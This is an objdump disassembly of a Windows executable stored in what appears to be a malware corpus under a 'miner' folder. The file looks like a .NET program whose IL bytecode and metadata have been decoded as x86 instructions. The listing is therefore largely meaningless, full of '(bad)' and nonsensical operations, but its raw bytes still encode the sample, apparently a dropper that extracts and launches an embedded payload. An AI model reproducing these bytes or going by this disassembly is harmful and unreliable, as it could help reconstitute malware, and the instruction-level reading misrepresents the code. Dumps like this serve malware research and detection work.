
malware_samples/miner/b1d2285d8177f163359558735054b4691a7f4bab740219d97179d16ffa3942e3.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	c0 2b 00             	shrb   $0x0,(%ebx)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 48 23 00       	add    $0x234800,%eax
  402013:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	de ad be ef 1b 30    	fisubrs 0x301befbe(%ebp)
  402056:	04 00                	add    $0x0,%al
  402058:	30 02                	xor    %al,(%edx)
  40205a:	00 00                	add    %al,(%eax)
  40205c:	01 00                	add    %eax,(%eax)
  40205e:	00 11                	add    %dl,(%ecx)
  402060:	1f                   	pop    %ds
  402061:	1c 28                	sbb    $0x28,%al
  402063:	03 00                	add    (%eax),%eax
  402065:	00 0a                	add    %cl,(%edx)
  402067:	72 01                	jb     0x40206a
  402069:	00 00                	add    %al,(%eax)
  40206b:	70 28                	jo     0x402095
  40206d:	04 00                	add    $0x0,%al
  40206f:	00 0a                	add    %cl,(%edx)
  402071:	13 19                	adc    (%ecx),%ebx
  402073:	12 19                	adc    (%ecx),%bl
  402075:	fe                   	(bad)
  402076:	16                   	push   %ss
  402077:	06                   	push   %es
  402078:	00 00                	add    %al,(%eax)
  40207a:	01 6f 05             	add    %ebp,0x5(%edi)
  40207d:	00 00                	add    %al,(%eax)
  40207f:	0a 28                	or     (%eax),%ch
  402081:	06                   	push   %es
  402082:	00 00                	add    %al,(%eax)
  402084:	0a 28                	or     (%eax),%ch
  402086:	07                   	pop    %es
  402087:	00 00                	add    %al,(%eax)
  402089:	0a 0a                	or     (%edx),%cl
  40208b:	06                   	push   %es
  40208c:	28 08                	sub    %cl,(%eax)
  40208e:	00 00                	add    %al,(%eax)
  402090:	0a 26                	or     (%esi),%ah
  402092:	73 09                	jae    0x40209d
  402094:	00 00                	add    %al,(%eax)
  402096:	0a 0b                	or     (%ebx),%cl
  402098:	28 0a                	sub    %cl,(%edx)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	0a 6f 0b             	or     0xb(%edi),%ch
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4020a4:	19 17                	sbb    %edx,(%edi)
  4020a6:	73 0c                	jae    0x4020b4
  4020a8:	00 00                	add    %al,(%eax)
  4020aa:	0a 0d 09 6f 0d 00    	or     0xd6f09,%cl
  4020b0:	00 0a                	add    %cl,(%edx)
  4020b2:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  4020b5:	1f                   	pop    %ds
  4020b6:	ec                   	in     (%dx),%al
  4020b7:	6a 18                	push   $0x18
  4020b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ba:	0e                   	push   %cs
  4020bb:	00 00                	add    %al,(%eax)
  4020bd:	0a 26                	or     (%esi),%ah
  4020bf:	1f                   	pop    %ds
  4020c0:	14 8d                	adc    $0x8d,%al
  4020c2:	12 00                	adc    (%eax),%al
  4020c4:	00 01                	add    %al,(%ecx)
  4020c6:	13 05 09 11 05 16    	adc    0x16051109,%eax
  4020cc:	1f                   	pop    %ds
  4020cd:	14 6f                	adc    $0x6f,%al
  4020cf:	0f 00 00             	sldt   (%eax)
  4020d2:	0a 26                	or     (%esi),%ah
  4020d4:	1a 8d 12 00 00 01    	sbb    0x1000012(%ebp),%cl
  4020da:	25 d0 01 00 00       	and    $0x1d0,%eax
  4020df:	04 28                	add    $0x28,%al
  4020e1:	11 00                	adc    %eax,(%eax)
  4020e3:	00 0a                	add    %cl,(%edx)
  4020e5:	13 06                	adc    (%esi),%eax
  4020e7:	17                   	pop    %ss
  4020e8:	13 07                	adc    (%edi),%eax
  4020ea:	16                   	push   %ss
  4020eb:	13 08                	adc    (%eax),%ecx
  4020ed:	2b 1a                	sub    (%edx),%ebx
  4020ef:	11 05 1f 10 11 08    	adc    %eax,0x811101f
  4020f5:	58                   	pop    %eax
  4020f6:	91                   	xchg   %eax,%ecx
  4020f7:	11 06                	adc    %eax,(%esi)
  4020f9:	11 08                	adc    %ecx,(%eax)
  4020fb:	91                   	xchg   %eax,%ecx
  4020fc:	2e 05 16 13 07 2b    	cs add $0x2b071316,%eax
  402102:	0b 11                	or     (%ecx),%edx
  402104:	08 17                	or     %dl,(%edi)
  402106:	58                   	pop    %eax
  402107:	13 08                	adc    (%eax),%ecx
  402109:	11 08                	adc    %ecx,(%eax)
  40210b:	1a 32                	sbb    (%edx),%dh
  40210d:	e1 11                	loope  0x402120
  40210f:	07                   	pop    %es
  402110:	2d 05 dd 78 01       	sub    $0x178dd05,%eax
  402115:	00 00                	add    %al,(%eax)
  402117:	11 05 16 28 12 00    	adc    %eax,0x122816
  40211d:	00 0a                	add    %cl,(%edx)
  40211f:	13 09                	adc    (%ecx),%ecx
  402121:	11 05 1e 28 13 00    	adc    %eax,0x13281e
  402127:	00 0a                	add    %cl,(%edx)
  402129:	13 0a                	adc    (%edx),%ecx
  40212b:	11 09                	adc    %ecx,(%ecx)
  40212d:	16                   	push   %ss
  40212e:	6a 31                	push   $0x31
  402130:	0a 11                	or     (%ecx),%dl
  402132:	09 11                	or     %edx,(%ecx)
  402134:	04 1f                	add    $0x1f,%al
  402136:	64 6a 59             	fs push $0x59
  402139:	32 05 dd 4f 01 00    	xor    0x14fdd,%al
  40213f:	00 11                	add    %dl,(%ecx)
  402141:	0a 16                	or     (%esi),%dl
  402143:	31 06                	xor    %eax,(%esi)
  402145:	11 0a                	adc    %ecx,(%edx)
  402147:	1f                   	pop    %ds
  402148:	64 31 05 dd 3f 01 00 	xor    %eax,%fs:0x13fdd
  40214f:	00 09                	add    %cl,(%ecx)
  402151:	11 09                	adc    %ecx,(%ecx)
  402153:	16                   	push   %ss
  402154:	6f                   	outsl  %ds:(%esi),(%dx)
  402155:	0e                   	push   %cs
  402156:	00 00                	add    %al,(%eax)
  402158:	0a 26                	or     (%esi),%ah
  40215a:	09 1a                	or     %ebx,(%edx)
  40215c:	6a 17                	push   $0x17
  40215e:	6f                   	outsl  %ds:(%esi),(%dx)
  40215f:	0e                   	push   %cs
  402160:	00 00                	add    %al,(%eax)
  402162:	0a 26                	or     (%esi),%ah
  402164:	16                   	push   %ss
  402165:	13 0b                	adc    (%ebx),%ecx
  402167:	38 d6                	cmp    %dl,%dh
  402169:	00 00                	add    %al,(%eax)
  40216b:	00 1a                	add    %bl,(%edx)
  40216d:	8d 12                	lea    (%edx),%edx
  40216f:	00 00                	add    %al,(%eax)
  402171:	01 13                	add    %edx,(%ebx)
  402173:	0c 09                	or     $0x9,%al
  402175:	11 0c 16             	adc    %ecx,(%esi,%edx,1)
  402178:	1a 6f 0f             	sbb    0xf(%edi),%ch
  40217b:	00 00                	add    %al,(%eax)
  40217d:	0a 26                	or     (%esi),%ah
  40217f:	11 0c 16             	adc    %ecx,(%esi,%edx,1)
  402182:	28 13                	sub    %dl,(%ebx)
  402184:	00 00                	add    %al,(%eax)
  402186:	0a 13                	or     (%ebx),%dl
  402188:	0d 11 0d 8d 12       	or     $0x128d0d11,%eax
  40218d:	00 00                	add    %al,(%eax)
  40218f:	01 13                	add    %edx,(%ebx)
  402191:	0e                   	push   %cs
  402192:	09 11                	or     %edx,(%ecx)
  402194:	0e                   	push   %cs
  402195:	16                   	push   %ss
  402196:	11 0d 6f 0f 00 00    	adc    %ecx,0xf6f
  40219c:	0a 26                	or     (%esi),%ah
  40219e:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4021a1:	00 0a                	add    %cl,(%edx)
  4021a3:	11 0e                	adc    %ecx,(%esi)
  4021a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a6:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  4021ab:	0f 1e 8d 12 00 00 01 	nopl   0x1000012(%ebp)
  4021b2:	13 10                	adc    (%eax),%edx
  4021b4:	09 11                	or     %edx,(%ecx)
  4021b6:	10 16                	adc    %dl,(%esi)
  4021b8:	1e                   	push   %ds
  4021b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ba:	0f 00 00             	sldt   (%eax)
  4021bd:	0a 26                	or     (%esi),%ah
  4021bf:	11 10                	adc    %edx,(%eax)
  4021c1:	16                   	push   %ss
  4021c2:	28 12                	sub    %dl,(%edx)
  4021c4:	00 00                	add    %al,(%eax)
  4021c6:	0a 13                	or     (%ebx),%dl
  4021c8:	11 06                	adc    %eax,(%esi)
  4021ca:	11 0f                	adc    %ecx,(%edi)
  4021cc:	28 07                	sub    %al,(%edi)
  4021ce:	00 00                	add    %al,(%eax)
  4021d0:	0a 13                	or     (%ebx),%dl
  4021d2:	12 11                	adc    (%ecx),%dl
  4021d4:	12 18                	adc    (%eax),%bl
  4021d6:	18 73 0c             	sbb    %dh,0xc(%ebx)
  4021d9:	00 00                	add    %al,(%eax)
  4021db:	0a 13                	or     (%ebx),%dl
  4021dd:	13 20                	adc    (%eax),%esp
  4021df:	00 40 01             	add    %al,0x1(%eax)
  4021e2:	00 8d 12 00 00 01    	add    %cl,0x1000012(%ebp)
  4021e8:	13 14 11             	adc    (%ecx,%edx,1),%edx
  4021eb:	11 13                	adc    %edx,(%ebx)
  4021ed:	15 2b 30 11 14       	adc    $0x1411302b,%eax
  4021f2:	8e 69 6a             	mov    0x6a(%ecx),%gs
  4021f5:	11 15 28 16 00 00    	adc    %edx,0x1628
  4021fb:	0a 69 13             	or     0x13(%ecx),%ch
  4021fe:	16                   	push   %ss
  4021ff:	09 11                	or     %edx,(%ecx)
  402201:	14 16                	adc    $0x16,%al
  402203:	11 16                	adc    %edx,(%esi)
  402205:	6f                   	outsl  %ds:(%esi),(%dx)
  402206:	0f 00 00             	sldt   (%eax)
  402209:	0a 13                	or     (%ebx),%dl
  40220b:	17                   	pop    %ss
  40220c:	11 13                	adc    %edx,(%ebx)
  40220e:	11 14 16             	adc    %edx,(%esi,%edx,1)
  402211:	11 17                	adc    %edx,(%edi)
  402213:	6f                   	outsl  %ds:(%esi),(%dx)
  402214:	17                   	pop    %ss
  402215:	00 00                	add    %al,(%eax)
  402217:	0a 11                	or     (%ecx),%dl
  402219:	15 11 17 6a 59       	adc    $0x596a1711,%eax
  40221e:	13 15 11 15 16 6a    	adc    0x6a161511,%edx
  402224:	30 ca                	xor    %cl,%dl
  402226:	de 0c 11             	fimuls (%ecx,%edx,1)
  402229:	13 2c 07             	adc    (%edi,%eax,1),%ebp
  40222c:	11 13                	adc    %edx,(%ebx)
  40222e:	6f                   	outsl  %ds:(%esi),(%dx)
  40222f:	18 00                	sbb    %al,(%eax)
  402231:	00 0a                	add    %cl,(%edx)
  402233:	dc 07                	faddl  (%edi)
  402235:	11 12                	adc    %edx,(%edx)
  402237:	6f                   	outsl  %ds:(%esi),(%dx)
  402238:	19 00                	sbb    %eax,(%eax)
  40223a:	00 0a                	add    %cl,(%edx)
  40223c:	11 0b                	adc    %ecx,(%ebx)
  40223e:	17                   	pop    %ss
  40223f:	58                   	pop    %eax
  402240:	13 0b                	adc    (%ebx),%ecx
  402242:	11 0b                	adc    %ecx,(%ebx)
  402244:	11 0a                	adc    %ecx,(%edx)
  402246:	3f                   	aas
  402247:	21 ff                	and    %edi,%edi
  402249:	ff                   	(bad)
  40224a:	ff                   	lcall  (bad)
  40224b:	de 0a                	fimuls (%edx)
  40224d:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  402250:	09 6f 18             	or     %ebp,0x18(%edi)
  402253:	00 00                	add    %al,(%eax)
  402255:	0a dc                	or     %ah,%bl
  402257:	07                   	pop    %es
  402258:	6f                   	outsl  %ds:(%esi),(%dx)
  402259:	1a 00                	sbb    (%eax),%al
  40225b:	00 0a                	add    %cl,(%edx)
  40225d:	13 1a                	adc    (%edx),%ebx
  40225f:	2b 10                	sub    (%eax),%edx
  402261:	12 1a                	adc    (%edx),%bl
  402263:	28 1b                	sub    %bl,(%ebx)
  402265:	00 00                	add    %al,(%eax)
  402267:	0a 13                	or     (%ebx),%dl
  402269:	18 11                	sbb    %dl,(%ecx)
  40226b:	18 28                	sbb    %ch,(%eax)
  40226d:	02 00                	add    (%eax),%al
  40226f:	00 06                	add    %al,(%esi)
  402271:	12 1a                	adc    (%edx),%bl
  402273:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402276:	00 0a                	add    %cl,(%edx)
  402278:	2d e7 de 0e 12       	sub    $0x120edee7,%eax
  40227d:	1a fe                	sbb    %dh,%bh
  40227f:	16                   	push   %ss
  402280:	02 00                	add    (%eax),%al
  402282:	00 1b                	add    %bl,(%ebx)
  402284:	6f                   	outsl  %ds:(%esi),(%dx)
  402285:	18 00                	sbb    %al,(%eax)
  402287:	00 0a                	add    %cl,(%edx)
  402289:	dc de                	(bad)
  40228b:	03 26                	add    (%esi),%esp
  40228d:	de 00                	fiadds (%eax)
  40228f:	2a 41 64             	sub    0x64(%ecx),%al
  402292:	00 00                	add    %al,(%eax)
  402294:	02 00                	add    (%eax),%al
  402296:	00 00                	add    %al,(%eax)
  402298:	7e 01                	jle    0x40229b
  40229a:	00 00                	add    %al,(%eax)
  40229c:	4a                   	dec    %edx
  40229d:	00 00                	add    %al,(%eax)
  40229f:	00 c8                	add    %cl,%al
  4022a1:	01 00                	add    %eax,(%eax)
  4022a3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4022a6:	00 00                	add    %al,(%eax)
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	00 00                	add    %al,(%eax)
  4022ac:	02 00                	add    (%eax),%al
  4022ae:	00 00                	add    %al,(%eax)
  4022b0:	4c                   	dec    %esp
  4022b1:	00 00                	add    %al,(%eax)
  4022b3:	00 a1 01 00 00 ed    	add    %ah,-0x12ffffff(%ecx)
  4022b9:	01 00                	add    %eax,(%eax)
  4022bb:	00 0a                	add    %cl,(%edx)
  4022bd:	00 00                	add    %al,(%eax)
  4022bf:	00 00                	add    %al,(%eax)
  4022c1:	00 00                	add    %al,(%eax)
  4022c3:	00 02                	add    %al,(%edx)
  4022c5:	00 00                	add    %al,(%eax)
  4022c7:	00 ff                	add    %bh,%bh
  4022c9:	01 00                	add    %eax,(%eax)
  4022cb:	00 1d 00 00 00 1c    	add    %bl,0x1c000000
  4022d1:	02 00                	add    (%eax),%al
  4022d3:	00 0e                	add    %cl,(%esi)
	...
  4022e1:	00 00                	add    %al,(%eax)
  4022e3:	00 2c 02             	add    %ch,(%edx,%eax,1)
  4022e6:	00 00                	add    %al,(%eax)
  4022e8:	2c 02                	sub    $0x2,%al
  4022ea:	00 00                	add    %al,(%eax)
  4022ec:	03 00                	add    (%eax),%eax
  4022ee:	00 00                	add    %al,(%eax)
  4022f0:	01 00                	add    %eax,(%eax)
  4022f2:	00 01                	add    %al,(%ecx)
  4022f4:	1b 30                	sbb    (%eax),%esi
  4022f6:	02 00                	add    (%eax),%al
  4022f8:	2f                   	das
  4022f9:	00 00                	add    %al,(%eax)
  4022fb:	00 02                	add    %al,(%edx)
  4022fd:	00 00                	add    %al,(%eax)
  4022ff:	11 73 1d             	adc    %esi,0x1d(%ebx)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 0b                	or     (%ebx),%cl
  402306:	07                   	pop    %es
  402307:	02 6f 1e             	add    0x1e(%edi),%ch
  40230a:	00 00                	add    %al,(%eax)
  40230c:	0a 07                	or     (%edi),%al
  40230e:	02 28                	add    (%eax),%ch
  402310:	1f                   	pop    %ds
  402311:	00 00                	add    %al,(%eax)
  402313:	0a 6f 20             	or     0x20(%edi),%ch
  402316:	00 00                	add    %al,(%eax)
  402318:	0a 07                	or     (%edi),%al
  40231a:	17                   	pop    %ss
  40231b:	6f                   	outsl  %ds:(%esi),(%dx)
  40231c:	21 00                	and    %eax,(%eax)
  40231e:	00 0a                	add    %cl,(%edx)
  402320:	07                   	pop    %es
  402321:	0a 06                	or     (%esi),%al
  402323:	28 22                	sub    %ah,(%edx)
  402325:	00 00                	add    %al,(%eax)
  402327:	0a 26                	or     (%esi),%ah
  402329:	de 03                	fiadds (%ebx)
  40232b:	26 de 00             	fiadds %es:(%eax)
  40232e:	2a 00                	sub    (%eax),%al
  402330:	01 10                	add    %edx,(%eax)
  402332:	00 00                	add    %al,(%eax)
  402334:	00 00                	add    %al,(%eax)
  402336:	00 00                	add    %al,(%eax)
  402338:	2b 2b                	sub    (%ebx),%ebp
  40233a:	00 03                	add    %al,(%ebx)
  40233c:	01 00                	add    %eax,(%eax)
  40233e:	00 01                	add    %al,(%ecx)
  402340:	1e                   	push   %ds
  402341:	02 28                	add    (%eax),%ch
  402343:	23 00                	and    (%eax),%eax
  402345:	00 0a                	add    %cl,(%edx)
  402347:	2a 42 53             	sub    0x53(%edx),%al
  40234a:	4a                   	dec    %edx
  40234b:	42                   	inc    %edx
  40234c:	01 00                	add    %eax,(%eax)
  40234e:	01 00                	add    %eax,(%eax)
  402350:	00 00                	add    %al,(%eax)
  402352:	00 00                	add    %al,(%eax)
  402354:	0c 00                	or     $0x0,%al
  402356:	00 00                	add    %al,(%eax)
  402358:	76 34                	jbe    0x40238e
  40235a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40235d:	33 30                	xor    (%eax),%esi
  40235f:	33 31                	xor    (%ecx),%esi
  402361:	39 00                	cmp    %eax,(%eax)
  402363:	00 00                	add    %al,(%eax)
  402365:	00 05 00 6c 00 00    	add    %al,0x6c00
  40236b:	00 98 02 00 00 23    	add    %bl,0x23000002(%eax)
  402371:	7e 00                	jle    0x402373
  402373:	00 04 03             	add    %al,(%ebx,%eax,1)
  402376:	00 00                	add    %al,(%eax)
  402378:	e4 03                	in     $0x3,%al
  40237a:	00 00                	add    %al,(%eax)
  40237c:	23 53 74             	and    0x74(%ebx),%edx
  40237f:	72 69                	jb     0x4023ea
  402381:	6e                   	outsb  %ds:(%esi),(%dx)
  402382:	67 73 00             	addr16 jae 0x402385
  402385:	00 00                	add    %al,(%eax)
  402387:	00 e8                	add    %ch,%al
  402389:	06                   	push   %es
  40238a:	00 00                	add    %al,(%eax)
  40238c:	1c 00                	sbb    $0x0,%al
  40238e:	00 00                	add    %al,(%eax)
  402390:	23 55 53             	and    0x53(%ebp),%edx
  402393:	00 04 07             	add    %al,(%edi,%eax,1)
  402396:	00 00                	add    %al,(%eax)
  402398:	10 00                	adc    %al,(%eax)
  40239a:	00 00                	add    %al,(%eax)
  40239c:	23 47 55             	and    0x55(%edi),%eax
  40239f:	49                   	dec    %ecx
  4023a0:	44                   	inc    %esp
  4023a1:	00 00                	add    %al,(%eax)
  4023a3:	00 14 07             	add    %dl,(%edi,%eax,1)
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	28 01                	sub    %al,(%ecx)
  4023aa:	00 00                	add    %al,(%eax)
  4023ac:	23 42 6c             	and    0x6c(%edx),%eax
  4023af:	6f                   	outsl  %ds:(%esi),(%dx)
  4023b0:	62 00                	bound  %eax,(%eax)
  4023b2:	00 00                	add    %al,(%eax)
  4023b4:	00 00                	add    %al,(%eax)
  4023b6:	00 00                	add    %al,(%eax)
  4023b8:	02 00                	add    (%eax),%al
  4023ba:	00 01                	add    %al,(%ecx)
  4023bc:	57                   	push   %edi
  4023bd:	15 02 28 09 00       	adc    $0x92802,%eax
  4023c2:	00 00                	add    %al,(%eax)
  4023c4:	00 fa                	add    %bh,%dl
  4023c6:	25 33 00 16 00       	and    $0x160033,%eax
  4023cb:	00 01                	add    %al,(%ecx)
  4023cd:	00 00                	add    %al,(%eax)
  4023cf:	00 1d 00 00 00 03    	add    %bl,0x3000000
  4023d5:	00 00                	add    %al,(%eax)
  4023d7:	00 01                	add    %al,(%ecx)
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	00 03                	add    %al,(%ebx)
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	00 01                	add    %al,(%ecx)
  4023e1:	00 00                	add    %al,(%eax)
  4023e3:	00 23                	add    %ah,(%ebx)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	00 03                	add    %al,(%ebx)
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	00 02                	add    %al,(%edx)
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	00 02                	add    %al,(%edx)
  4023f1:	00 00                	add    %al,(%eax)
  4023f3:	00 01                	add    %al,(%ecx)
  4023f5:	00 00                	add    %al,(%eax)
  4023f7:	00 01                	add    %al,(%ecx)
  4023f9:	00 00                	add    %al,(%eax)
  4023fb:	00 02                	add    %al,(%edx)
  4023fd:	00 00                	add    %al,(%eax)
  4023ff:	00 00                	add    %al,(%eax)
  402401:	00 0a                	add    %cl,(%edx)
  402403:	00 01                	add    %al,(%ecx)
  402405:	00 00                	add    %al,(%eax)
  402407:	00 00                	add    %al,(%eax)
  402409:	00 06                	add    %al,(%esi)
  40240b:	00 4f 00             	add    %cl,0x0(%edi)
  40240e:	48                   	dec    %eax
  40240f:	00 06                	add    %al,(%esi)
  402411:	00 98 00 78 00 06    	add    %bl,0x6007800(%eax)
  402417:	00 b8 00 78 00 06    	add    %bh,0x6007800(%eax)
  40241d:	00 f0                	add    %dh,%al
  40241f:	00 48 00             	add    %cl,0x0(%eax)
  402422:	13 00                	adc    (%eax),%eax
  402424:	fc                   	cld
  402425:	00 00                	add    %al,(%eax)
  402427:	00 06                	add    %al,(%esi)
  402429:	00 18                	add    %bl,(%eax)
  40242b:	01 48 00             	add    %ecx,0x0(%eax)
  40242e:	06                   	push   %es
  40242f:	00 2e                	add    %ch,(%esi)
  402431:	01 48 00             	add    %ecx,0x0(%eax)
  402434:	06                   	push   %es
  402435:	00 46 01             	add    %al,0x1(%esi)
  402438:	3c 01                	cmp    $0x1,%al
  40243a:	06                   	push   %es
  40243b:	00 53 01             	add    %dl,0x1(%ebx)
  40243e:	3c 01                	cmp    $0x1,%al
  402440:	06                   	push   %es
  402441:	00 5d 01             	add    %bl,0x1(%ebp)
  402444:	3c 01                	cmp    $0x1,%al
  402446:	06                   	push   %es
  402447:	00 96 01 7b 01 06    	add    %dl,0x6017b01(%esi)
  40244d:	00 af 01 9d 01 06    	add    %ch,0x6019d01(%edi)
  402453:	00 da                	add    %bl,%dl
  402455:	01 3c 01             	add    %edi,(%ecx,%eax,1)
  402458:	06                   	push   %es
  402459:	00 e5                	add    %ah,%ch
  40245b:	01 3c 01             	add    %edi,(%ecx,%eax,1)
  40245e:	06                   	push   %es
  40245f:	00 ee                	add    %ch,%dh
  402461:	01 3c 01             	add    %edi,(%ecx,%eax,1)
  402464:	06                   	push   %es
  402465:	00 f9                	add    %bh,%cl
  402467:	01 3c 01             	add    %edi,(%ecx,%eax,1)
  40246a:	06                   	push   %es
  40246b:	00 0b                	add    %cl,(%ebx)
  40246d:	02 3c 01             	add    (%ecx,%eax,1),%bh
  402470:	06                   	push   %es
  402471:	00 1b                	add    %bl,(%ebx)
  402473:	02 48 00             	add    0x0(%eax),%cl
  402476:	06                   	push   %es
  402477:	00 6a 02             	add    %ch,0x2(%edx)
  40247a:	78 00                	js     0x40247c
  40247c:	06                   	push   %es
  40247d:	00 99 02 78 00 06    	add    %bl,0x6007802(%ecx)
  402483:	00 a8 02 48 00 06    	add    %ch,0x6004802(%eax)
  402489:	00 ae 02 48 00 06    	add    %ch,0x6004802(%esi)
  40248f:	00 d1                	add    %dl,%cl
  402491:	02 48 00             	add    0x0(%eax),%cl
  402494:	06                   	push   %es
  402495:	00 fa                	add    %bh,%dl
  402497:	02 ee                	add    %dh,%ch
  402499:	02 06                	add    (%esi),%al
  40249b:	00 16                	add    %dl,(%esi)
  40249d:	03 48 00             	add    0x0(%eax),%ecx
  4024a0:	06                   	push   %es
  4024a1:	00 25 03 48 00 2f    	add    %ah,0x2f004803
  4024a7:	00 3d 03 00 00 0a    	add    %bh,0xa000003
  4024ad:	00 7e 03             	add    %bh,0x3(%esi)
  4024b0:	6b 03 0a             	imul   $0xa,(%ebx),%eax
  4024b3:	00 d6                	add    %dl,%dh
  4024b5:	03 6b 03             	add    0x3(%ebx),%ebp
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	00 00                	add    %al,(%eax)
  4024bc:	01 00                	add    %eax,(%eax)
  4024be:	00 00                	add    %al,(%eax)
  4024c0:	00 00                	add    %al,(%eax)
  4024c2:	01 00                	add    %eax,(%eax)
  4024c4:	01 00                	add    %eax,(%eax)
  4024c6:	00 00                	add    %al,(%eax)
  4024c8:	10 00                	adc    %al,(%eax)
  4024ca:	28 00                	sub    %al,(%eax)
  4024cc:	30 00                	xor    %al,(%eax)
  4024ce:	05 00 01 00 01       	add    $0x1000100,%eax
  4024d3:	00 00                	add    %al,(%eax)
  4024d5:	00 00                	add    %al,(%eax)
  4024d7:	00 25 02 00 00 05    	add    %ah,0x5000002
  4024dd:	00 01                	add    %al,(%ecx)
  4024df:	00 04 00             	add    %al,(%eax,%eax,1)
  4024e2:	13 01                	adc    (%ecx),%eax
  4024e4:	85 02                	test   %eax,(%edx)
  4024e6:	63 00                	arpl   %eax,(%eax)
  4024e8:	54                   	push   %esp
  4024e9:	20 00                	and    %al,(%eax)
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	00 91 00 56 00 0a    	add    %dl,0xa005600(%ecx)
  4024f3:	00 01                	add    %al,(%ecx)
  4024f5:	00 f4                	add    %dh,%ah
  4024f7:	22 00                	and    (%eax),%al
  4024f9:	00 00                	add    %al,(%eax)
  4024fb:	00 91 00 5b 00 0e    	add    %dl,0xe005b00(%ecx)
  402501:	00 01                	add    %al,(%ecx)
  402503:	00 40 23             	add    %al,0x23(%eax)
  402506:	00 00                	add    %al,(%eax)
  402508:	00 00                	add    %al,(%eax)
  40250a:	86 18                	xchg   %bl,(%eax)
  40250c:	6a 00                	push   $0x0
  40250e:	13 00                	adc    (%eax),%eax
  402510:	02 00                	add    (%eax),%al
  402512:	00 00                	add    %al,(%eax)
  402514:	01 00                	add    %eax,(%eax)
  402516:	70 00                	jo     0x402518
  402518:	11 00                	adc    %eax,(%eax)
  40251a:	6a 00                	push   $0x0
  40251c:	17                   	pop    %ss
  40251d:	00 19                	add    %bl,(%ecx)
  40251f:	00 6a 00             	add    %ch,0x0(%edx)
  402522:	13 00                	adc    (%eax),%eax
  402524:	21 00                	and    %eax,(%eax)
  402526:	0a 01                	or     (%ecx),%al
  402528:	1c 00                	sbb    $0x0,%al
  40252a:	31 00                	xor    %eax,(%eax)
  40252c:	1d 01 22 00 09       	sbb    $0x9002201,%eax
  402531:	00 25 01 27 00 39    	add    %ah,0x39002701
  402537:	00 35 01 2b 00 41    	add    %dh,0x41002b01
  40253d:	00 4b 01             	add    %cl,0x1(%ebx)
  402540:	2b 00                	sub    (%eax),%eax
  402542:	49                   	dec    %ecx
  402543:	00 6b 01             	add    %ch,0x1(%ebx)
  402546:	31 00                	xor    %eax,(%eax)
  402548:	0c 00                	or     $0x0,%al
  40254a:	6a 00                	push   $0x0
  40254c:	13 00                	adc    (%eax),%eax
  40254e:	61                   	popa
  40254f:	00 b8 01 3d 00 61    	add    %bh,0x61003d01(%eax)
  402555:	00 cd                	add    %cl,%ch
  402557:	01 27                	add    %esp,(%edi)
  402559:	00 69 00             	add    %ch,0x0(%ecx)
  40255c:	6a 00                	push   $0x0
  40255e:	42                   	inc    %edx
  40255f:	00 81 00 00 02 4b    	add    %al,0x4b020000(%ecx)
  402565:	00 81 00 16 02 4f    	add    %al,0x4f021600(%ecx)
  40256b:	00 81 00 20 02 56    	add    %al,0x56022000(%ecx)
  402571:	00 99 00 6a 00 13    	add    %bl,0x13006a00(%ecx)
  402577:	00 a1 00 c1 02 66    	add    %ah,0x6602c100(%ecx)
  40257d:	00 b9 00 de 02 6e    	add    %bh,0x6e02de00(%ecx)
  402583:	00 b9 00 e6 02 75    	add    %bh,0x7502e600(%ecx)
  402589:	00 c1                	add    %al,%cl
  40258b:	00 03                	add    %al,(%ebx)
  40258d:	03 7c 00 c1          	add    -0x3f(%eax,%eax,1),%edi
  402591:	00 0c 03             	add    %cl,(%ebx,%eax,1)
  402594:	81 00 c9 00 1b 03    	addl   $0x31b00c9,(%eax)
  40259a:	87 00                	xchg   %eax,(%eax)
  40259c:	81 00 1f 03 8d 00    	addl   $0x8d031f,(%eax)
  4025a2:	d1 00                	roll   $1,(%eax)
  4025a4:	31 03                	xor    %eax,(%ebx)
  4025a6:	13 00                	adc    (%eax),%eax
  4025a8:	0c 00                	or     $0x0,%al
  4025aa:	39 03                	cmp    %eax,(%ebx)
  4025ac:	95                   	xchg   %eax,%ebp
  4025ad:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4025b0:	48                   	dec    %eax
  4025b1:	03 9b 00 14 00 56    	add    0x56001400(%ebx),%ebx
  4025b7:	03 aa 00 14 00 62    	add    0x62001400(%edx),%ebp
  4025bd:	03 af 00 e1 00 6a    	add    0x6a00e100(%edi),%ebp
  4025c3:	00 13                	add    %dl,(%ebx)
  4025c5:	00 e1                	add    %ah,%cl
  4025c7:	00 8f 03 e2 00 41    	add    %cl,0x4100e203(%edi)
  4025cd:	00 9c 03 e7 00 e1 00 	add    %bl,0xe100e7(%ebx,%eax,1)
  4025d4:	ad                   	lods   %ds:(%esi),%eax
  4025d5:	03 e2                	add    %edx,%esp
  4025d7:	00 e1                	add    %ah,%cl
  4025d9:	00 c2                	add    %al,%dl
  4025db:	03 ec                	add    %esp,%ebp
  4025dd:	00 e9                	add    %ch,%cl
